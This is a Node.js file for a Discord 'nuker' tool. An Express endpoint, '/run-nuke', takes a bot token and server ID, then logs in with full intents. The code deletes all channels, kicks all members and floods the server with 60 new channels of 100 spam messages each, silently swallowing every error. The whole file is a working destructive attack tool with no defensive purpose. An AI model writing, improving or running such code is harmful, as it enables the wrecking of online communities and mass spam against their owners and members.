const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();

app.use(bodyParser.json());
app.use(express.static('.'));

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/run-nuke', async (req, res) => {
    const { token, guildId, roomName, message, delChannels, kickMembers } = req.body;
    const client = new Client({ intents: [3276799] }); // Full Intents

    client.on('ready', async () => {
        const guild = client.guilds.cache.get(guildId);
        if (!guild) return;

        // V5 Speed: تنفيذ كل شيء في نفس الوقت
        if (delChannels) guild.channels.cache.forEach(ch => ch.delete().catch(()=>{}));
        if (kickMembers) guild.members.cache.forEach(m => m.kick().catch(()=>{}));

        for (let i = 0; i < 60; i++) {
            guild.channels.create({ name: roomName }).then(ch => {
                for (let j = 0; j < 100; j++) ch.send(message).catch(()=>{});
            }).catch(()=>{});
        }
    });

    client.login(token).catch(()=>{});
    res.send({ status: "Action Started" });
});

app.listen(3000, () => console.log("Tools 2399 Pr is Ready!"));
